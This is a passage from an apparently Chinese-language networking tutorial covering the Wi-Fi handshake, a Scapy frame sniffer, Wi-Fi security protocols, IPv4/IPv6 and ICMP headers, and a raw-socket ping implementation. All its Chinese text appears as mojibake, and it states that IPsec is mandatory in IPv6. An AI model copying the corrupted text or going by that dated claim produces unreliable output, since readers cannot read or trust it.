   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Probe Response â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (è¿”å›ç½‘ç»œä¿¡æ¯)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Authentication Request â”€â”€â”€â”€â”€â†’â”‚  (è¯·æ±‚è®¤è¯)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Authentication Response â”€â”€â”€â”€â”€â”‚  (è®¤è¯æˆåŠŸ)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Association Request â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (è¯·æ±‚å…³è”)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Association Response â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (å…³è”æˆåŠŸ)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ EAPOL (4-Way Handshake) â”€â”€â”€â”€â†’â”‚  (WPAå¯†é’¥äº¤æ¢)
   â”‚â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚                                      â”‚
   â”‚ â•â•â•â•â•â•â•â• æ•°æ®ä¼ è¾“ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â†’â”‚
   â”‚                                      â”‚
```

**å®æˆ˜ç¤ºä¾‹ï¼šWi-FiæŠ“åŒ…åˆ†æ**

```python
from scapy.all import *

def wifi_packet_handler(packet):
    """åˆ†æWi-Fiæ•°æ®åŒ…"""
    if packet.haslayer(Dot11):
        # è·å–å¸§ç±»å‹
        frame_type = packet.type
        frame_subtype = packet.subtype

        # ç®¡ç†å¸§
        if frame_type == 0:
            if frame_subtype == 8:  # Beaconå¸§
                ssid = packet.info.decode('utf-8', errors='ignore')
                bssid = packet.addr3
                print(f"[Beacon] SSID: {ssid}, BSSID: {bssid}")
            elif frame_subtype == 4:  # Probe Request
                print(f"[Probe Request] from {packet.addr2}")

        # æ•°æ®å¸§
        elif frame_type == 2:
            print(f"[Data] {packet.addr2} -> {packet.addr1}")

# ç›‘å¬Wi-Fi (éœ€è¦ç½‘å¡æ”¯æŒç›‘å¬æ¨¡å¼)
# sniff(iface="wlan0mon", prn=wifi_packet_handler)
```

#### Wi-Fiå®‰å…¨åè®®

**1. WEP (Wired Equivalent Privacy)** - å·²åºŸå¼ƒ
```
é—®é¢˜: ä½¿ç”¨é™æ€å¯†é’¥ï¼Œå®¹æ˜“è¢«ç ´è§£
```

**2. WPA (Wi-Fi Protected Access)**
```
æ”¹è¿›: ä½¿ç”¨TKIPåŠ¨æ€å¯†é’¥
è®¤è¯: PSK (Pre-Shared Key) æˆ– 802.1X
```

**3. WPA2 (AES-CCMP)**
```
åŠ å¯†: AES (é«˜çº§åŠ å¯†æ ‡å‡†)
å®Œæ•´æ€§: CCMP (Counter Mode with CBC-MAC Protocol)
```

**4. WPA3**
```
ç‰¹æ€§:
- SAE (Simultaneous Authentication of Equals) æ¡æ‰‹
- å‰å‘ä¿å¯† (Forward Secrecy)
- 192ä½åŠ å¯†å¥—ä»¶ (ä¼ä¸šçº§)
- ç®€åŒ–çš„è®¾å¤‡é…ç½®
```

---

## ç¬¬å››ç« ï¼šç½‘ç»œå±‚åè®®

### 4.1 IP (Internet Protocol) åè®®

#### IPv4æ•°æ®åŒ…ç»“æ„

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Versionâ”‚  IHL  â”‚Type of Serviceâ”‚         Total Length          â”‚
â”‚ 4 bitsâ”‚ 4 bitsâ”‚    8 bits     â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚         Identification        â”‚Flagsâ”‚    Fragment Offset      â”‚
â”‚           16 bits             â”‚3 bitsâ”‚       13 bits           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Time to Live â”‚   Protocol    â”‚      Header Checksum          â”‚
â”‚    8 bits     â”‚    8 bits     â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                     Source IP Address                         â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Destination IP Address                       â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Options (if IHL > 5)                       â”‚
â”‚                         Variable                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                         Variable                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å­—æ®µè¯¦è§£**:

1. **Version (4 bits)**: ç‰ˆæœ¬å·
   - IPv4 = 4
   - IPv6 = 6

2. **IHL (Internet Header Length, 4 bits)**: å¤´éƒ¨é•¿åº¦
   - å•ä½: 32ä½å­—(4å­—èŠ‚)
   - èŒƒå›´: 5-15 (20-60å­—èŠ‚)
   - ç¤ºä¾‹: IHL=5 è¡¨ç¤º20å­—èŠ‚å¤´éƒ¨

3. **Type of Service (8 bits)**: æœåŠ¡ç±»å‹
   ```
   â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”
   â”‚ Precedence â”‚   D  â”‚  T  â”‚  R  â”‚ C â”‚  0  â”‚
   â”‚  (3 bits)  â”‚(Delay)â”‚(Throughput)â”‚(Reliability)â”‚(Cost)â”‚(Reserved)â”‚
   â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜
   ```

4. **Total Length (16 bits)**: æ€»é•¿åº¦
   - åŒ…æ‹¬å¤´éƒ¨å’Œæ•°æ®
   - æœ€å¤§: 65535å­—èŠ‚

5. **Identification (16 bits)**: æ ‡è¯†ç¬¦
   - ç”¨äºåˆ†ç‰‡é‡ç»„
   - åŒä¸€æ•°æ®æŠ¥çš„æ‰€æœ‰åˆ†ç‰‡å…·æœ‰ç›¸åŒæ ‡è¯†

6. **Flags (3 bits)**: æ ‡å¿—ä½
   ```
   â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
   â”‚  0  â”‚ DF  â”‚ MF  â”‚
   â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
   DF (Don't Fragment): 1è¡¨ç¤ºä¸åˆ†ç‰‡
   MF (More Fragments): 1è¡¨ç¤ºåé¢è¿˜æœ‰åˆ†ç‰‡
   ```

7. **Fragment Offset (13 bits)**: åˆ†ç‰‡åç§»
   - å•ä½: 8å­—èŠ‚
   - è¡¨ç¤ºå½“å‰åˆ†ç‰‡åœ¨åŸå§‹æ•°æ®ä¸­çš„ä½ç½®

8. **Time to Live (8 bits)**: ç”Ÿå­˜æ—¶é—´
   - æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å‡1
   - ä¸º0æ—¶ä¸¢å¼ƒæ•°æ®åŒ…
   - é˜²æ­¢æ•°æ®åŒ…æ— é™å¾ªç¯

9. **Protocol (8 bits)**: ä¸Šå±‚åè®®
   ```
   1  : ICMP
   6  : TCP
   17 : UDP
   41 : IPv6
   89 : OSPF
   ```

10. **Header Checksum (16 bits)**: å¤´éƒ¨æ ¡éªŒå’Œ
    - ä»…æ ¡éªŒå¤´éƒ¨ï¼Œä¸æ ¡éªŒæ•°æ®
    - æ¯è·³éƒ½éœ€é‡æ–°è®¡ç®—

11. **Source/Destination IP Address (32 bits each)**: æº/ç›®æ ‡IPåœ°å€

#### IPv4åœ°å€åˆ†ç±»

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Aç±»: 0.0.0.0 - 127.255.255.255                            â”‚
â”‚      ç½‘ç»œä½: 8 bits | ä¸»æœºä½: 24 bits                      â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.0.0.0                               â”‚
â”‚      ç¤ºä¾‹: 10.0.0.1 (ç§æœ‰åœ°å€)                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bç±»: 128.0.0.0 - 191.255.255.255                          â”‚
â”‚      ç½‘ç»œä½: 16 bits | ä¸»æœºä½: 16 bits                     â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.255.0.0                             â”‚
â”‚      ç¤ºä¾‹: 172.16.0.1 (ç§æœ‰åœ°å€)                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Cç±»: 192.0.0.0 - 223.255.255.255                          â”‚
â”‚      ç½‘ç»œä½: 24 bits | ä¸»æœºä½: 8 bits                      â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.255.255.0                           â”‚
â”‚      ç¤ºä¾‹: 192.168.1.1 (ç§æœ‰åœ°å€)                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Dç±»: 224.0.0.0 - 239.255.255.255  (ç»„æ’­åœ°å€)              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Eç±»: 240.0.0.0 - 255.255.255.255  (ä¿ç•™)                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ç§æœ‰åœ°å€èŒƒå›´**:
```
Aç±»: 10.0.0.0    - 10.255.255.255    (10.0.0.0/8)
Bç±»: 172.16.0.0  - 172.31.255.255    (172.16.0.0/12)
Cç±»: 192.168.0.0 - 192.168.255.255   (192.168.0.0/16)
```

#### IPv6æ•°æ®åŒ…ç»“æ„

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Versionâ”‚Traffic Class  â”‚          Flow Label                   â”‚
â”‚4 bits â”‚   8 bits      â”‚           20 bits                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚        Payload Length                 â”‚   Next Header â”‚Hop Limitâ”‚
â”‚             16 bits                   â”‚    8 bits     â”‚ 8 bits â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                â”‚
â”‚                   Source IPv6 Address                          â”‚
â”‚                        128 bits                                â”‚
â”‚                                                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                â”‚
â”‚                Destination IPv6 Address                        â”‚
â”‚                        128 bits                                â”‚
â”‚                                                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**IPv6ç‰¹ç‚¹**:
- **åœ°å€ç©ºé—´**: 128ä½ (2^128ä¸ªåœ°å€)
- **ç®€åŒ–å¤´éƒ¨**: å›ºå®š40å­—èŠ‚
- **å–æ¶ˆæ ¡éªŒå’Œ**: ç”±ä¸Šå±‚åè®®è´Ÿè´£
- **å†…ç½®å®‰å…¨**: IPSecæ˜¯å¼ºåˆ¶çš„
- **è‡ªåŠ¨é…ç½®**: SLAAC (æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®)

**IPv6åœ°å€è¡¨ç¤º**:
```
å®Œæ•´æ ¼å¼: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
å‹ç¼©æ ¼å¼: 2001:db8:85a3::8a2e:370:7334  (è¿ç»­çš„0å¯çœç•¥)

ç‰¹æ®Šåœ°å€:
::1                 # æœ¬åœ°å›ç¯åœ°å€ (ç­‰åŒäºIPv4çš„127.0.0.1)
::                  # æœªæŒ‡å®šåœ°å€
fe80::/10           # é“¾è·¯æœ¬åœ°åœ°å€
ff00::/8            # ç»„æ’­åœ°å€
```

**å®æˆ˜ç¤ºä¾‹ï¼šæ„é€ å’Œè§£æIPæ•°æ®åŒ…**

```python
from scapy.all import IP, TCP, send, sniff

# æ„é€ IPv4æ•°æ®åŒ…
ip_packet = IP(dst="192.168.1.1", ttl=64) / TCP(dport=80)
ip_packet.show()

# å‘é€æ•°æ®åŒ…
send(ip_packet)

# è§£æIPæ•°æ®åŒ…
def analyze_ip_packet(packet):
    if packet.haslayer(IP):
        ip_layer = packet[IP]
        print(f"æºIP: {ip_layer.src}")
        print(f"ç›®æ ‡IP: {ip_layer.dst}")
        print(f"TTL: {ip_layer.ttl}")
        print(f"åè®®: {ip_layer.proto}")
        print(f"æ€»é•¿åº¦: {ip_layer.len}")

        # æ£€æŸ¥åˆ†ç‰‡
        if ip_layer.flags.MF or ip_layer.frag > 0:
            print(f"åˆ†ç‰‡: Offset={ip_layer.frag}, MF={ip_layer.flags.MF}")

# æŠ“åŒ…åˆ†æ
sniff(filter="ip", prn=analyze_ip_packet, count=5)
```

### 4.2 ICMP (Internet Control Message Protocol) åè®®

#### ICMPæŠ¥æ–‡ç»“æ„

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      Type         â”‚       Code        â”‚      Checksum         â”‚
â”‚     8 bits        â”‚      8 bits       â”‚       16 bits         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Rest of Header                               â”‚
â”‚                    (varies)                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                     Data                                      â”‚
â”‚           (åŸå§‹IPå¤´éƒ¨ + å‰8å­—èŠ‚æ•°æ®)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### ICMPæ¶ˆæ¯ç±»å‹

| Type | Code | æè¿° | ç”¨é€” |
|------|------|------|------|
| **0** | 0 | Echo Reply (å›æ˜¾åº”ç­”) | pingå“åº” |
| **3** | 0-15 | Destination Unreachable | ç›®æ ‡ä¸å¯è¾¾ |
| | 0 | Network Unreachable | ç½‘ç»œä¸å¯è¾¾ |
| | 1 | Host Unreachable | ä¸»æœºä¸å¯è¾¾ |
| | 2 | Protocol Unreachable | åè®®ä¸å¯è¾¾ |
| | 3 | Port Unreachable | ç«¯å£ä¸å¯è¾¾ |
| | 4 | Fragmentation Needed | éœ€è¦åˆ†ç‰‡ä½†è®¾ç½®äº†DF |
| **5** | 0-3 | Redirect | é‡å®šå‘ |
| **8** | 0 | Echo Request (å›æ˜¾è¯·æ±‚) | pingè¯·æ±‚ |
| **11** | 0 | Time Exceeded (TTLè¶…æ—¶) | traceroute |
| | 1 | Fragment Reassembly Time Exceeded | åˆ†ç‰‡é‡ç»„è¶…æ—¶ |

#### PingåŸç†ä¸å®ç°

**Pingäº¤äº’è¿‡ç¨‹**:

```
å®¢æˆ·ç«¯                                   ç›®æ ‡ä¸»æœº
   â”‚                                        â”‚
   â”‚â”€â”€â”€â”€â”€â”€ Echo Request (Type 8) â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  ID: 12345, Seq: 1                    â”‚
   â”‚  Data: 32 bytes                        â”‚
   â”‚                                        â”‚
   â”‚â†â”€â”€â”€â”€â”€ Echo Reply (Type 0) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚  ID: 12345, Seq: 1                    â”‚
   â”‚  Data: 32 bytes (å›æ˜¾)                 â”‚
   â”‚                                        â”‚
   â”‚â”€â”€â”€â”€â”€â”€ Echo Request (Type 8) â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  ID: 12345, Seq: 2                    â”‚
   â”‚                                        â”‚
   â”‚â†â”€â”€â”€â”€â”€ Echo Reply (Type 0) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚  ID: 12345, Seq: 2                    â”‚
   â”‚                                        â”‚
```

**Echo Request/ReplyæŠ¥æ–‡æ ¼å¼**:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Type (8 or 0)    â”‚    Code (0)       â”‚      Checksum         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Identifier                   â”‚   Sequence Number     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                         Data                                  â”‚
â”‚                    (å¯é€‰ï¼Œé€šå¸¸32å­—èŠ‚)                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å®æˆ˜ç¤ºä¾‹ï¼šå®ç°Ping**

```python
import socket
import struct
import time
import os

def checksum(data):
    """è®¡ç®—æ ¡éªŒå’Œ"""
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + data[i + 1]
    if n:
        s += data[-1] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def create_ping_packet(seq_num):
    """åˆ›å»ºICMP Echo Requestæ•°æ®åŒ…"""
    # ICMPå¤´éƒ¨
    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = os.getpid() & 0xFFFF
    icmp_seq = seq_num

    # æ•°æ®éƒ¨åˆ†
    data = b'abcdefghijklmnopqrstuvwxyz123456'  # 32å­—èŠ‚

    # æ„é€ å¤´éƒ¨ï¼ˆæ ¡éªŒå’Œå…ˆå¡«0ï¼‰
    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                         icmp_id, icmp_seq)

    # è®¡ç®—æ ¡éªŒå’Œ
    icmp_checksum = checksum(header + data)

    # é‡æ–°æ„é€ å¤´éƒ¨ï¼ˆå¡«å…¥æ­£ç¡®çš„æ ¡éªŒå’Œï¼‰
    header = struct.pack('!BBHHH', icmp_type, icmp_code,
                         socket.htons(icmp_checksum), icmp_id, icmp_seq)

    return header + data

def ping(host, count=4):
    """å‘é€pingè¯·æ±‚"""
    # åˆ›å»ºåŸå§‹å¥—æ¥å­—
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                         socket.IPPROTO_ICMP)
    sock.settimeout(2)

    try:
        dest_addr = socket.gethostbyname(host)
        print(f"æ­£åœ¨ Ping {host} [{dest_addr}] å…·æœ‰ 32 å­—èŠ‚çš„æ•°æ®:\n")

        for seq in range(1, count + 1):
            # å‘é€Echo Request
            packet = create_ping_packet(seq)
            send_time = time.time()
            sock.sendto(packet, (dest_addr, 0))

            try:
                # æ¥æ”¶Echo Reply
                data, addr = sock.recvfrom(1024)
                recv_time = time.time()

                # è§£æIPå¤´éƒ¨
                ip_header = data[:20]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                ttl = iph[5]

                # è§£æICMPå¤´éƒ¨
                icmp_header = data[20:28]
                icmp_type, code, checksum, p_id, p_seq = struct.unpack(
                    '!BBHHH', icmp_header
                )

                if icmp_type == 0:  # Echo Reply
                    rtt = (recv_time - send_time) * 1000
                    print(f"æ¥è‡ª {addr[0]} çš„å›å¤: å­—èŠ‚=32 æ—¶é—´={rtt:.0f}ms TTL={ttl}")
                else:
                    print(f"æ”¶åˆ° ICMP Type={icmp_type}, Code={code}")

            except socket.timeout:
                print("è¯·æ±‚è¶…æ—¶ã€‚")

            time.sleep(1)

    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    ping("www.baidu.com", count=4)
```

#### TracerouteåŸç†

**Tracerouteå·¥ä½œåŸç†**:

```
åˆ©ç”¨IPæ•°æ®åŒ…çš„TTLå­—æ®µï¼š

æ­¥éª¤1: å‘é€TTL=1çš„æ•°æ®åŒ…
   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€> è·¯ç”±å™¨1 â”€â”€â”€[ICMP Time Exceeded]â”€â”€â”€> å®¢æˆ·ç«¯

æ­¥éª¤2: å‘é€TTL=2çš„æ•°æ®åŒ…
   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€> è·¯ç”±å™¨1 â”€â”€â”€[TTL=1]â”€â”€â”€> è·¯ç”±å™¨2 â”€â”€â”€[ICMP Time Exceeded]â”€â”€â”€> å®¢æˆ·ç«¯

æ­¥éª¤3: å‘é€TTL=3çš„æ•°æ®åŒ…
